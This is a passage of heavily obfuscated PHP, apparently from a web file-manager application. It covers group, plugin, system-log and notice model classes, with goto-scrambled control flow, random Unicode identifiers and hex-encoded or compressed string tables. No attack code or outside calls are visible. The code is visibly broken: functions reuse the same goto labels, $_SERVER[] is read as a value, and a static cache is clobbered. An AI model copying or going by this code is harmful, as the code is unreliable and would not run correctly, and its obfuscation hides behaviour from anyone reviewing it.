Model($c[2147])->where($c)->limit($EԘ)->select(); if (!$b) { return array(); } $b = array_to_keyvalue($b, $c[33], $c[2066]); goto C껅; C껅: $b = $this->where(array($c[2138] => array($c[7], $b)))->select(); if (!$b) { return array(); } return $b; goto b㦇; b㦇: } protected function _listDataApplyItem($c) { $Bߑ = array($c); $this->_listDataApply($Bߑ); return $Bߑ[0]; } protected function _listDataApply(&$fӚ) { goto dՓ; Eͭ: $this->_listAppendParent($fӚ); $this->_listAppendSourceRoot($fӚ, $d㠃); goto dŖ͵; dՓ: $c󺶧ӌ =& $_SERVER[ԥ]; if (!$fӚ) { return; } $d㠃 = array_to_keyvalue($fӚ, $c󺶧ӌ[33], $c󺶧ӌ[2066]); goto f; f: $this->_listAppendChildren($fӚ); $this->_listAppendChildrenMember($fӚ); $this->_listAppendMeta($fӚ, $d㠃); goto Eͭ; dŖ͵: } private function _listAppendChildren(&$aˍ) { goto aֳ; aֳ: $F᭗ =& $_SERVER[ԥ]; $cԤȚ = $F᭗[357]; $Aӫۓ = array(); goto b; bǃ: $Aӫۓ = array_to_keyvalue($Aӫۓ, $F᭗[446]); foreach ($aˍ as &$a) { $a[$F᭗[2148]] = isset($Aӫۓ[$a[$F᭗[2066]] . $F᭗[2149]]); } goto EǙ; b: $cޫ = count($aˍ); $Fސ = $this->tablePrefix . $this->tableName; for ($A鈅 = 0, $Dѐ = 0; $A鈅 < $cޫ; $A鈅++) { $Dѐ++; $FУ = $aˍ[$A鈅][$F᭗[2066]]; $cԤȚ .= "\x53\x45\x4c\105\103\x54\40\52\40\106\122\x4f\115\40\x28\123\x45\x4c\x45\x43\x54\40\47{$FУ}\x5f\143\150\x69\154\x64\x27\x20\x61\x73\x20\x68\141\163\x20\106\x52\117\x4d\40\x60{$Fސ}\x60\x20\167\150\x65\162\145\40\x70\141\162\x65\156\164\x49\x44\x3d{$FУ}\x20\154\151\x6d\151\164\40\61\51\40\141\163\40\x74\x62\x5f{$FУ}\x20\165\x6e\x69\x6f\156\40\x61\x6c\x6c\x20"; if (($Dѐ >= 20 || $A鈅 == $cޫ - 1) && $cԤȚ) { $cԤȚ = substr($cԤȚ, 0, -strlen($F᭗[445])); $C = $this->query($cԤȚ); $Aӫۓ = array_merge($Aӫۓ, $C); $Dѐ = 0; $cԤȚ = $F᭗[33]; } } goto bǃ; EǙ: } private function _listAppendChildrenMember(&$F׉ه) { goto Eϝ; Eϝ: $A˦ =& $_SERVER[ԥ]; $b̞֬ = $A˦[357]; $F᷑ = array(); goto cԪڽ; AК: $F᷑ = array_to_keyvalue($F᷑, $A˦[446]); foreach ($F׉ه as &$d×) { $d×[$A˦[2150]] = isset($F᷑[$d×[$A˦[2066]] . $A˦[2149]]); } goto b; cԪڽ: $c׊̎ = count($F׉ه); $ĊɎ = $this->tablePrefix . $A˦[2140]; for ($F = 0, $fދÚ = 0; $F < $c׊̎; $F++) { $fދÚ++; $A񺻧 = $F׉ه[$F][$A˦[2066]]; $b̞֬ .= "\123\105\x4c\x45\103\124\x20\52\x20\x46\x52\x4f\x4d\40\x28\123\105\114\x45\x43\x54\x20\47{$A񺻧}\x5f\143\x68\151\x6c\144\x27\x20\141\x73\40\x68\x61\163\40\106\122\x4f\x4d\x20\x60{$ĊɎ}\x60\x20\167\x68\x65\x72\x65\x20\147\162\157\x75\160\x49\x44\75{$A񺻧}\x20\x6c\x69\155\151\164\40\x31\x29\40\x61\163\x20\164\x62\x5f{$A񺻧}\40\165\156\151\157\156\x20\141\154\154\x20"; if (($fދÚ >= 20 || $F == $c׊̎ - 1) && $b̞֬) { $b̞֬ = substr($b̞֬, 0, -strlen($A˦[445])); $e婡چ = $this->query($b̞֬); $F᷑ = array_merge($F᷑, $e婡چ); $fދÚ = 0; $b̞֬ = $A˦[33]; } } goto AК; b: } private function _listAppendMeta(&$EҚ, $b) { $d =& $_SERVER[ԥ]; $eҌ҇ = array($d[2066] => array($d[7], $b)); $bɘư = Model($d[2139])->where($eҌ҇)->select(); $bɘư = array_to_keyvalue_group($bɘư, $d[2066]); foreach ($bɘư as &$c燝ۺ) { $c燝ۺ = array_to_keyvalue($c燝ۺ, $d[89], $d[355]); } foreach ($EҚ as &$bɤ) { $bɤ[$d[413]] = array(); if (isset($bɘư[$bɤ[$d[2066]]])) { $bɤ[$d[413]] = $bɘư[$bɤ[$d[2066]]]; } } } protected function parentLevelArray($bҭ) { $dƍϳ =& $_SERVER[ԥ]; $bҭ = explode($dƍϳ[47], trim($bҭ, $dƍϳ[47])); $bҭ = array_remove_value($bҭ, $dƍϳ[464]); return $bҭ; } private function _listAppendParent(&$B) { goto AڐⅧ; Eʸ: $dᙅ = array(); foreach ($F as $aш => $a􅆍) { if (!$a􅆍) { $dᙅ[] = $aш; } } if ($dᙅ) { $b쮤 = array($E옚[2138] => array($E옚[380], $dᙅ)); $Bעش = $this->field($E옚[2151])->where($b쮤)->select(); $F = array_to_keyvalue($Bעش, $E옚[2066], $E옚[28]); $F = array_merge_index($F, $F); } goto aˣ; AڐⅧ: $E옚 =& $_SERVER[ԥ]; $F = array(); foreach ($B as &$cߧ) { $F[$cߧ[$E옚[2066]]] = $cߧ[$E옚[28]]; $fᡍ = $this->parentLevelArray($cߧ[$E옚[455]]); foreach ($fᡍ as $bꡮȉ) { if (!isset($F[$bꡮȉ])) { $F[$bꡮȉ] = 0; } } } goto Eʸ; aˣ: foreach ($B as &$cߧ) { $fᡍ = $this->parentLevelArray($cߧ[$E옚[455]]); $Fռ = $E옚[33]; foreach ($fᡍ as $bꡮȉ) { $Fռ .= $F[$bꡮȉ] . $E옚[8]; } if ($fᡍ) { $Fռ .= $cߧ[$E옚[28]]; } $cߧ[$E옚[459]] = str_replace($E옚[463], $E옚[8], $Fռ); } goto a装; a装: } private function _listAppendSourceRoot(&$bɴȩ, $e̓) { goto C֩; C֩: $c޿۴ =& $_SERVER[ԥ]; $F֘ = array($c޿۴[367] => SourceModel::TYPE_GROUP, $c޿۴[457] => 0, $c޿۴[452] => array($c޿۴[7], $e̓)); $Fӡ = $c޿۴[2152]; goto Eӑ; E򯂂: foreach ($bɴȩ as &$A) { $A[$c޿۴[387]] = $Dҗ[$A[$c޿۴[2066]]] ? $Dҗ[$A[$c޿۴[2066]]] : array(); } goto FĨ; Eӑ: $Dҗ = Model($c޿۴[744])->order($c޿۴[2153])->field($Fӡ)->where($F֘)->select(); $Dҗ = array_to_keyvalue($Dҗ, $c޿۴[452]); $Dҗ = array_remove_key($Dҗ, $c޿۴[452]); goto E򯂂; FĨ: } protected function resetParentLevel() { $c =& $_SERVER[ԥ]; $fʭ = $c[2066]; $C𚔎 = $this->select(); $C𚔎 = array_to_keyvalue($C𚔎, $fʭ); foreach ($C𚔎 as $D馨) { goto D폏; e: $this->where(array($fʭ => $D馨[$fʭ]))->save(array($c[521] => $b铒)); goto F諾; D폏: $E = $D馨; $b铒 = array(); while ($E[$c[457]] != 0) { $b铒[] = $E[$c[457]]; $E = $C𚔎[$E[$c[457]]]; } goto E; E: $b铒[] = 0; $b铒 = $c[47] . implode($c[47], array_reverse($b铒)) . $c[47]; $this->setNamePinyin($D馨[$fʭ], $D馨[$c[28]]); goto e; F諾: } return $C𚔎; } public function groupNameAuto($cۑδ, $AԄ) { $e =& $_SERVER[ԥ]; $aأ = $this->where(array($e[364] => $cۑδ))->getField($e[28], !0); if (!$aأ || !in_array($AԄ, $aأ)) { return $AԄ; } for ($f = 1; $f <= count($aأ) + 1; $f++) { $Bӣ = $AԄ . "\x28{$f}\x29"; if (!in_array($Bӣ, $aأ)) { return $Bӣ; } } } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\56\x70\154\165\x67\151\x6e\114\151\x73\x74"; public $field = array("\156\141\x6d\145", "\x73\x74\x61\164\165\163", "\162\x65\x67\x69\145\x73\x74", "\143\x6f\x6e\x66\151\x67"); public function loadList($a܉ = false) { $dߚ = array_to_keyvalue($this->listData(), $_SERVER[ԥ][28]); if ($a܉) { return $dߚ[$a܉]; } return $dߚ; } public function init() { $A層 =& $_SERVER[ԥ]; Hook::trigger($A層[2154]); $d𲮇 = $this->loadPluginList(); foreach ($d𲮇 as $fԅ => $f۶Ԭ) { $C = $this->appAllow($fԅ, $f۶Ԭ); if (!$C) { continue; } foreach ($f۶Ԭ[$A層[2155]] as $BƊ => $eԖφ) { Hook::bind($BƊ, $eԖφ); } } Hook::trigger($A層[2156]); Hook::trigger(ACTION); } public function appAllow($d, $fݔ, $d冄 = true) { $Dͅ =& $_SERVER[ԥ]; $f禅 = PLUGIN_DIR . $d . $Dͅ[2157]; if (!is_array($fݔ) || !is_array($fݔ[$Dͅ[2155]]) || !is_file($f禅) || $fݔ[$Dͅ[673]] != 1) { return !1; } if ($d冄 && !Action($Dͅ[2158])->checkAuth($d)) { return !1; } return !0; } public function unInstall($FҬ) { $cӜ艥 =& $_SERVER[ԥ]; $BķПł = $this->loadList($FҬ); if (file_exists(PLUGIN_DIR . $FҬ)) { Hook::apply($FҬ . $cӜ艥[2159]); } $this->remove($BķПł[$cӜ艥[363]]); } public function changeStatus($eއ, $d) { $Eɷ͡ =& $_SERVER[ԥ]; $CƸ = $this->loadList($eއ); if ($d) { Hook::apply($eއ . $Eɷ͡[2160]); } $this->update($CƸ[$Eɷ͡[363]], array($Eɷ͡[2161] => $d)); } public function appRegist($C▄£, $Cġ) { $C󘊔 =& $_SERVER[ԥ]; $dҡ = $this->loadList($C▄£); if ($dҡ) { $this->update($dҡ[$C󘊔[363]], array($C󘊔[2155] => $Cġ)); } else { $D͒ = array($C󘊔[28] => $C▄£, $C󘊔[2155] => $Cġ, $C󘊔[673] => 0, $C󘊔[6] => $this->getConfigDefault($C▄£)); $this->insert($D͒); } } public function getConfigDefault($F܇) { $a盏 =& $_SERVER[ԥ]; $f΍ = array(); $F᝟ = $this->getPackageJson($F܇); if (!$F᝟ && is_array($F᝟[$a盏[2162]])) { return $f΍; } foreach ($F᝟[$a盏[2162]] as $b辘 => $D۳) { if (!isset($D۳[$a盏[355]]) || isset($f΍[$b辘])) { continue; } $f΍[$b辘] = $D۳[$a盏[355]]; } return $f΍; } public function getPackageJson($A̺ϸ) { return Hook::apply($A̺ϸ . $_SERVER[ԥ][2163]); } public function getConfig($DČ¹, $aചƦ = false) { $eܐ =& $_SERVER[ԥ]; $E¢𷥅 = array(); $e洤 = $this->loadList($DČ¹); if ($e洤 && is_array($e洤[$eܐ[6]])) { $E¢𷥅 = $e洤[$eܐ[6]]; } if (!$E¢𷥅 || $aചƦ) { $E¢𷥅 = $this->getConfigDefault($DČ¹); } return $E¢𷥅; } public function setConfig($d, $B䵶¥ = false) { goto Eâҷ; e: if ($B䵶¥ == !1) { $B䵶¥ = $this->getConfigDefault($d); } $f = $e䈡좩[$cם[6]]; foreach ($B䵶¥ as $F觌ꞙ => $Dͥ) { $f[$F觌ꞙ] = is_string($Dͥ) ? trim($Dͥ) : $Dͥ; } goto fӘȂ; fӘȂ: $this->update($e䈡좩[$cם[363]], array($cם[6] => $f)); goto EύŜ; Eâҷ: $cם =& $_SERVER[ԥ]; $e䈡좩 = $this->loadList($d); if (!$e䈡좩) { return !1; } goto e; EύŜ: } public function viewList() { goto fޫ; fܴ: return $e٫̾; goto Cבſ; fޫ: $B =& $_SERVER[ԥ]; $E = $this->loadList(); $this->pluginScan($E); goto D˶; D˶: $E = $this->loadPluginList(); $e٫̾ = array(); foreach ($E as $E => $b٪) { unset($b٪[$B[2155]], $b٪[$B[6]]); $cՈ = PLUGIN_DIR . $b٪[$B[28]] . $B[2157]; if (!is_file($cՈ)) { continue; } $ḑ䉦 = Hook::apply($b٪[$B[28]] . $B[2163]); if (is_array($ḑ䉦)) { $e٫̾[$E] = array_merge($b٪, $ḑ䉦); } } goto fܴ; Cבſ: } private function loadPluginList() { $F񋍯 =& $_SERVER[ԥ]; $F = $this->loadList(); if (strtolower(MOD) == $F񋍯[2164]) { return $F; } $d = Hook::trigger($F񋍯[2165], $F); if ($F && !$d) { die; } return $d ? $d : $F; } private function pluginScan($bڗ) { $F =& $_SERVER[ԥ]; recursion_dir(PLUGIN_DIR, $Cю, $cǷ, 0); foreach ($Cю as $d͇ѦÊ) { $aݷ = get_path_this($d͇ѦÊ); if (isset($bڗ[$aݷ]) || !file_exists($d͇ѦÊ . $F[2166]) || !file_exists($d͇ѦÊ . $F[2157])) { continue; } Hook::apply($aݷ . $F[2160]); } } } goto E׶; fӔ: define($_SERVER[ԥ][0], $_SERVER[ԥ][1]); $_SERVER[] = explode($_SERVER[ԥ][2], gzinflate(substr($_SERVER[ԥ][3], 10, -8))); function Model($c = '', $Fپ = '', $Â = '') { goto f銒; f銒: $d =& $_SERVER[]; static $B = array(); $B = strtolower($Fپ . $d[0] . $c); goto dވᡦ; fѴ: $B[$B] = new ModelBase($c, $Fپ, $Â); return $B[$B]; goto f㡶ߗ؉; dވᡦ: if (isset($B[$B])) { return $B[$B]; } if ($c) { $c = strtoupper($c[0]) . substr($c, 1); $f = $c . $d[1]; if (class_exists($f)) { $B[$B] = new $f(); return $B[$B]; } } if (!$Â) { $Â = $GLOBALS[$d[2]][$d[3]]; } goto fѴ; f㡶ߗ؉: } goto c; Dŕ˴: function beforeShutdown() { Hook::trigger($_SERVER[][36]); } $_SERVER[$_SERVER[][37]] = BASIC_PATH; $_SERVER[$_SERVER[][38]] = LIB_DIR; goto a; a: function beforeShutdownError($F = false, $Cө = '', $Dܚ = '', $F = 0) { $d׳ =& $_SERVER[]; switch ($F) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $Bِ̦ = $d׳[39]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $Bِ̦ = $d׳[40]; break; case E_STRICT: $Bِ̦ = $d׳[41]; break; case E_NOTICE: case E_USER_NOTICE: $Bِ̦ = $d׳[42]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $Bِ̦ = $d׳[43]; break; default: break; } if (!$Bِ̦ || $Bِ̦ == $d׳[42] || $Bِ̦ == $d׳[43]) { return; } $Dܚ = $d׳[4] . str_replace($_SERVER[$d׳[37]], $d׳[20], $Dܚ); $Bܷ = $Bِ̦ . $d׳[44] . $Cө . $d׳[44] . $Dܚ . $d׳[44] . $F; write_log($Bܷ . $d׳[18] . get_caller_msg(1), $d׳[19]); } $_SERVER[$_SERVER[][45]] = $_SERVER[$_SERVER[][37]] . $_SERVER[][46]; $cߝ = strrev(base64_decode($_SERVER[][47])); goto cɣ; a㐅ԕ: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\x6d\56\x4c\x69\147\x68\164\x41\160\x70"; public $modelType = "\123\x79\163\164\x65\x6d\117\x70\164\x69\157\156"; public $field = array("\x6e\141\x6d\x65", "\x67\x72\157\x75\160", "\144\x65\x73\x63", "\143\157\x6e\x74\x65\x6e\164"); public function listData($Eɽ = false, $b© = "\155\157\144\151\146\x79\124\151\x6d\x65", $B = true) { return parent::listData($Eɽ, $b©, $B); } public function remove($C箛) { $Bɾ⍚ = $this->findByName($C箛); if (!$Bɾ⍚) { return !1; } return parent::remove($Bɾ⍚[$_SERVER[ԥ][363]]); } public function add($C) { if ($this->findByName($C[$_SERVER[ԥ][28]])) { return !1; } return parent::insert($C); } public function update($dƹ, $CƯ) { $F闋 =& $_SERVER[ԥ]; $E٪Բ = $this->findByName($dƹ); $B = $this->findByName($CƯ[$F闋[28]]); if (!$E٪Բ || $B && $B[$F闋[363]] != $E٪Բ[$F闋[363]]) { return !1; } return parent::update($E٪Բ[$F闋[363]], $CƯ); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\x73\164\145\155\x5f\x6c\157\147"; protected $dataAuto = array(array("\143\162\145\141\164\145\x54\151\x6d\x65", "\x74\x69\155\x65", "\151\x6e\x73\145\162\x74", "\146\x75\x6e\x63\x74\151\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $CӴ =& $_SERVER[ԥ]; return array($CӴ[2339] => LNG($CӴ[2340]), $CӴ[2341] => LNG($CӴ[2342]), $CӴ[2006] => LNG($CӴ[2343]), $CӴ[2344] => LNG($CӴ[2345]), $CӴ[2346] => LNG($CӴ[2347]), $CӴ[2348] => LNG($CӴ[2349]), $CӴ[2350] => LNG($CӴ[2351]), $CӴ[2352] => LNG($CӴ[2353]), $CӴ[2037] => LNG($CӴ[2354]), $CӴ[2038] => LNG($CӴ[2355]), $CӴ[2356] => LNG($CӴ[2357]), $CӴ[2358] => LNG($CӴ[2359]), $CӴ[2360] => LNG($CӴ[2361]), $CӴ[2362] => LNG($CӴ[2363]), $CӴ[2035] => LNG($CӴ[2364]), $CӴ[2041] => LNG($CӴ[2365]), $CӴ[2366] => LNG($CӴ[2367]), $CӴ[2368] => LNG($CӴ[2369]), $CӴ[2370] => LNG($CӴ[2371]), $CӴ[2372] => LNG($CӴ[2373]), $CӴ[2044] => LNG($CӴ[2374]), $CӴ[2045] => LNG($CӴ[2375]), $CӴ[2376] => LNG($CӴ[2377]), $CӴ[2378] => LNG($CӴ[2379]), $CӴ[2380] => LNG($CӴ[2381]), $CӴ[2382] => LNG($CӴ[2383]), $CӴ[2384] => LNG($CӴ[2385]), $CӴ[2039] => LNG($CӴ[2386]), $CӴ[2387] => LNG($CӴ[2388]), $CӴ[2389] => LNG($CӴ[2390]), $CӴ[2391] => LNG($CӴ[2391]), $CӴ[2392] => LNG($CӴ[2010]), $CӴ[2393] => LNG($CӴ[2394]), $CӴ[2395] => LNG($CӴ[2396]), $CӴ[2397] => LNG($CӴ[2398]), $CӴ[2399] => LNG($CӴ[2400]), $CӴ[2401] => LNG($CӴ[2402]), $CӴ[2403] => LNG($CӴ[2403]), $CӴ[2404] => LNG($CӴ[2405]), $CӴ[2406] => LNG($CӴ[2407]), $CӴ[2408] => LNG($CӴ[2409]), $CӴ[2410] => LNG($CӴ[2411]), $CӴ[2412] => LNG($CӴ[2413]), $CӴ[2414] => LNG($CӴ[2415])); } private function typeFile() { $dќȚ =& $_SERVER[ԥ]; $e䖸 = array($dќȚ[2041] => array($dќȚ[2042]), $dќȚ[2360] => array($dќȚ[2416]), $dќȚ[2362] => array($dќȚ[2417]), $dќȚ[2035] => array($dќȚ[2036]), $dќȚ[2368] => array(), $dќȚ[2370] => array(), $dќȚ[2372] => array(), $dќȚ[2044] => array($dќȚ[2046]), $dќȚ[2045] => array($dќȚ[2046]), $dќȚ[2376] => array($dќȚ[2418]), $dќȚ[2378] => array($dќȚ[2418]), $dќȚ[2380] => array($dќȚ[2419]), $dќȚ[2366] => array($dќȚ[2420]), $dќȚ[2382] => array($dќȚ[2421]), $dќȚ[2384] => array($dќȚ[2422]), $dќȚ[2039] => array($dќȚ[2040])); return $e䖸; } private function typeAll() { goto b; A: return $F; goto Eʽ; b: $dܑ̾ =& $_SERVER[ԥ]; $F = $this->typeList; $b = array_filter($this->typeFile()); goto F𱸯; F𱸯: foreach ($b as $cׯ => $D֓) { $F[$D֓[0]] = $F[$cׯ]; } $F[$dܑ̾[2046]] = LNG($dܑ̾[2423]); $F[$dܑ̾[2418]] = LNG($dܑ̾[2424]); goto A; Eʽ: } public function addLog($E, $fˌ = array()) { goto c; E: $F廃 = get_client_ip(); if (!$fˌ || strlen(json_encode($fˌ)) >= 1024) { $fˌ = array($cӯ[2425] => $F廃); } else { if (is_array($fˌ)) { $fˌ[$cӯ[2425]] = $F廃; } else { $fˌ = array($cӯ[1017] => $fˌ, $cӯ[2425] => $F廃); } } $fˌ = array($cӯ[1394] => Session::sign(), $cӯ[1395] => $C, $cӯ[29] => $E, $cӯ[1397] => json_encode($fˌ)); goto c; c: parent::add($fˌ); goto c; c: $cӯ =& $_SERVER[ԥ]; if (!isset($this->typeList[$E])) { return; } $C = USER_ID ? USER_ID : (isset($fˌ[$cӯ[1404]]) ? $fˌ[$cӯ[1404]] : 0); goto E; c: } public function remove($B) { $this->where(array($_SERVER[ԥ][381] => $B))->delete(); } private function _makeOrder($Aމ = '') { goto bꠋ; bꠋ: $e풣 =& $_SERVER[ԥ]; $BĦ = $e풣[183]; $f᠘ = array($e풣[398] => $e풣[399], $e풣[400] => $e풣[401]); goto E; E: $dʈ = Input::get($e풣[404], $e풣[7], $e풣[2204], array($e풣[2141], $e풣[400])); $dʈ = $f᠘[$dʈ]; $Aމ = $Aމ . "{$BĦ}\x20{$dʈ}"; goto e; e: return $this->order($Aމ); goto Eؑ; Eؑ: } public function get($C޴ʴ = '') { goto Bƃ; bѯ: if ($C޴ʴ[$Bσٽ[1404]]) { $b܃[$Bσٽ[1404]] = $C޴ʴ[$Bσٽ[1404]]; } if (isset($C޴ʴ[$Bσٽ[686]])) { $e = $C޴ʴ[$Bσٽ[686]]; $E = isset($C޴ʴ[$Bσٽ[687]]) ? $C޴ʴ[$Bσٽ[687]] : time(); $b܃[$Bσٽ[183]] = array($Bσٽ[317], array($e, $E)); } if ($C޴ʴ[$Bσٽ[29]]) { $cɍ = explode($Bσٽ[47], $C޴ʴ[$Bσٽ[29]]); $F˺ζ = $this->typeFile(); $e = array(); foreach ($cɍ as $bڗ) { $e[] = $bڗ; if (isset($F˺ζ[$bڗ])) { $e = array_merge($e, $F˺ζ[$bڗ]); } } $e = array_unique($e); if ($e) { $b܃[$Bσٽ[29]] = array($Bσٽ[7], $e); } } goto eſѪ; eſѪ: if (!empty($C޴ʴ[$Bσٽ[2425]])) { $b܃[$Bσٽ[401]] = array($Bσٽ[743], "\x25{$C޴ʴ[$Bσٽ[2425]]}\x25"); } $BƘ = $this->_makeOrder()->where($b܃)->selectPage(); if (empty($BƘ[$Bσٽ[350]])) { show_json(array(), !0, $BƘ[$Bσٽ[347]]); } goto a; Bƃ: $Bσٽ =& $_SERVER[ԥ]; if (!$C޴ʴ) { show_json(array()); } $b܃ = array(); goto bѯ; a: $BƘ[$Bσٽ[350]] = $this->logList($BƘ[$Bσٽ[350]]); return $BƘ; goto C; C: } private function ipAddress(&$B) { $b˅ =& $_SERVER[ԥ]; if (!empty($B[$b˅[2425]])) { $fͼ񆝏 = IpLocation::get($B[$b˅[2425]]); if ($fͼ񆝏 == $b˅[2426]) { $fͼ񆝏 = $b˅[2427]; } } else { $fͼ񆝏 = LNG($b˅[2428]); } $B[$b˅[2429]] = $fͼ񆝏; } private function descZipDownload($a쏉, &$a܍) { $bɧ˷ =& $_SERVER[ԥ]; if (!isset($a쏉[$bɧ˷[2430]])) { return; } $F = json_decode($a쏉[$bɧ˷[2430]], !0); foreach ($F as $cث) { if (!IO::init($cث[$bɧ˷[75]])) { continue; } if (!($E󆱣 = IO::infoFull($cث[$bɧ˷[75]]))) { continue; } $a쏉[$bɧ˷[75]] = $cث[$bɧ˷[75]]; $a܍[] = $a쏉[$bɧ˷[365]] = $E󆱣[$bɧ˷[365]]; $a܍[] = $a쏉[$bɧ˷[2246]] = $E󆱣[$bɧ˷[457]]; break; } return $a쏉; } private function getSourceList(&$Aёխ) { $D񛯭 =& $_SERVER[ԥ]; $dĮ̑ = array(); foreach ($Aёխ as $fƈ => $a邚) { goto Cчݥ; D: if ($Dݮ[$D񛯭[29]] == $D񛯭[2254]) { $dĮ̑[] = $Dݮ[$D񛯭[401]][$D񛯭[365]]; } goto AѠ; b׊ŵ: $dĮ̑[] = $Dݮ[$D񛯭[365]]; $dĮ̑[] = $Dݮ[$D񛯭[2246]]; if ($Dݮ[$D񛯭[29]] == $D񛯭[488]) { $dĮ̑[] = $Dݮ[$D񛯭[401]][$D񛯭[989]]; $dĮ̑[] = $Dݮ[$D񛯭[401]][$D񛯭[990]]; } goto D; Cчݥ: $Dݮ = json_decode($a邚[$D񛯭[401]], !0); if ($a邚[$D񛯭[29]] == $D񛯭[2038]) { $Dݮ = $this->descZipDownload($Dݮ, $dĮ̑); $Aёխ[$fƈ][$D񛯭[401]] = json_encode($Dݮ); continue; } if (strpos($a邚[$D񛯭[29]], $D񛯭[2247]) !== 0) { goto d; bխ: continue; goto EĊ; d: if (!isset($Dݮ[$D񛯭[75]]) || strpos($a邚[$D񛯭[29]], $D񛯭[2431]) !== 0) { continue; } if (!IO::init($Dݮ[$D񛯭[75]])) { continue; } if (!($bᣜ = IO::infoFull($Dݮ[$D񛯭[75]]))) { continue; } goto d; d: $dĮ̑[] = $Dݮ[$D񛯭[365]] = $bᣜ[$D񛯭[365]]; $dĮ̑[] = $Dݮ[$D񛯭[2246]] = $bᣜ[$D񛯭[457]]; $Aёխ[$fƈ][$D񛯭[401]] = json_encode($Dݮ); goto bխ; EĊ: } goto b׊ŵ; AѠ: } if (!$dĮ̑) { return array(); } return Model($D񛯭[744])->sourceListInfo($dĮ̑, !0); } private function logList($Aμ) { goto D׹; D׹: $a =& $_SERVER[ԥ]; $Aܫ鹯 = array_to_keyvalue($Aμ, $a[33], $a[1404]); $C = Model($a[473])->userListInfo(array_unique($Aܫ鹯)); goto F̗; F̗: $Eޫރ߹ = $this->getSourceList($Aμ); $bщ = $this->typeAll(); $dИޕ = array(); goto bƵڦ; bƵڦ: $aߎ = array(); foreach ($Aμ as $F => $a򌈱) { goto cƢߌ; c쏾Ї: $a򌈱[$a[28]] = isset($a[$a[28]]) ? $a[$a[28]] : LNG($a[2428]); $a򌈱[$a[2294]] = isset($a[$a[2294]]) ? $a[$a[2294]] : $a[33]; $a򌈱[$a[1312]] = isset($bщ[$bΒڋ]) ? $bщ[$bΒڋ] : $b㛭; goto aŢˉ; cʰ: $this->ipAddress($a򌈱); if (strpos($bΒڋ, $a[2247]) === 0 || isset($d»[$a[2246]])) { goto D; B: if ($d»[$a[2259]] && $d»[$a[2259]][$a[367]] == $a[1063]) { $aߎ[] = $a򌈱[$a[363]]; unset($Aμ[$F]); continue; } goto E﫶; e: if ($d»[$a[29]] == $a[2254]) { $d»[$a[401]][$a[365]] = $Eޫރ߹[$d»[$a[401]][$a[365]]]; } if ($d»[$a[29]] == $a[2033]) { $d»[$a[2259]] = $d»[$a[387]]; $d»[$a[2246]] = $d»[$a[2259]][$a[365]]; $d»[$a[387]] = !1; $d»[$a[365]] = $a[33]; } if ($d»[$a[387]] && $d»[$a[387]][$a[367]] == $a[1063]) { $aߎ[] = $a򌈱[$a[363]]; unset($Aμ[$F]); continue; } goto B; D: $d»[$a[387]] = $Eޫރ߹[$d»[$a[365]]]; $d»[$a[2259]] = $Eޫރ߹[$d»[$a[2246]]]; if ($d»[$a[29]] == $a[488]) { $d»[$a[401]][$a[989]] = $Eޫރ߹[$d»[$a[401]][$a[989]]]; $d»[$a[401]][$a[990]] = $Eޫރ߹[$d»[$a[401]][$a[990]]]; } goto e; E﫶: } $a򌈱[$a[401]] = $d»; goto aֱ; aֱ: unset($a򌈱[$a[2434]]); $dИޕ[] = $a򌈱; goto cϺ; cƢߌ: $bΒڋ = $a򌈱[$a[29]]; $a = isset($C[$a򌈱[$a[1404]]]) ? $C[$a򌈱[$a[1404]]] : !1; $b㛭 = strpos($bΒڋ, $a[2432]) === 0 ? LNG($a[2433]) : LNG($a[2428]); goto c쏾Ї; aŢˉ: $a򌈱[$a[2203]] = $a; $d» = json_decode($a򌈱[$a[401]], !0); $a򌈱[$a[2425]] = isset($d»[$a[2425]]) ? $d»[$a[2425]] : $a[33]; goto cʰ; cϺ: } $this->clearSystemPathLog($aߎ); goto Cϯۧ; Cϯۧ: return $dИޕ; goto Eʣ; Eʣ: } private function clearSystemPathLog($a) { $c勉š =& $_SERVER[ԥ]; if (count($a) == 0) { return; } $CǬȗ = array($c勉š[363] => array($c勉š[7], array_unique($a))); $this->where($CǬȗ)->delete(); } public function deviceList($Bߕ, $e = 0) { $Dܝכ =& $_SERVER[ԥ]; $Aߟ = array($Dܝכ[1404] => $Bߕ, $Dܝכ[183] => array($Dܝכ[913], $e), $Dܝכ[29] => $Dܝכ[2006]); $d = array(); $Bҗ = $this->field($Dܝכ[2435])->where($Aߟ)->order($Dܝכ[2257])->limit(50)->select(); foreach ($Bҗ as $a => $AлѠ) { goto E񋪘; Bѻ: unset($cާ[$Dܝכ[2425]]); $e = $this->deviceType($cާ[$Dܝכ[2248]]); if (isset($d[$e])) { continue; } goto eҠ; eҠ: $this->ipAddress($AлѠ); $AлѠ[$Dܝכ[401]] = $cާ; $d[$e] = $AлѠ; goto Dʵ; E񋪘: if ($a > 0 && abs($AлѠ[$Dܝכ[183]] - $Bҗ[$a - 1][$Dܝכ[183]]) < 5) { continue; } $cާ = json_decode($AлѠ[$Dܝכ[401]], !0); $AлѠ[$Dܝכ[2425]] = isset($cާ[$Dܝכ[2425]]) ? $cާ[$Dܝכ[2425]] : $Dܝכ[33]; goto Bѻ; Dʵ: } return array_values($d); } public function deviceType($FŎŲ) { return $FŎŲ; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\155\x2e\x6e\x6f\164\151\143\145\x4c\151\x73\x74"; public $field = array("\156\x61\x6d\x65", "\143\x6f\x6e\164\145\156\164", "\x61\165\164\x68", "\x6d\x6f\x64\145", "\x74\x69\155\x65", "\x74\x79\x70\145", "\x6c\145\166\145\x6c", "\x65\156\x61\142\154\x65", "\x73\x6f\162\164"); public function listData($bҬ = false, $C = "\163\x6f\162\x74", $Dֽ؋ = false) { return parent::listData($bҬ, $C, $Dֽ؋); } public function add($f텦) { $Dꪛ =& $_SERVER[ԥ]; $dθ = time(); if ($f텦[$Dꪛ[12]] == $Dꪛ[2436]) { $dθ = strtotime($f텦[$Dꪛ[186]]); } $f텦[$Dꪛ[186]] = $dθ; return parent::insert($f텦); } public function update($B, $bŢ) { goto A𿪞; Bۋ: $E = time(); if ($bŢ[$a҄[12]] 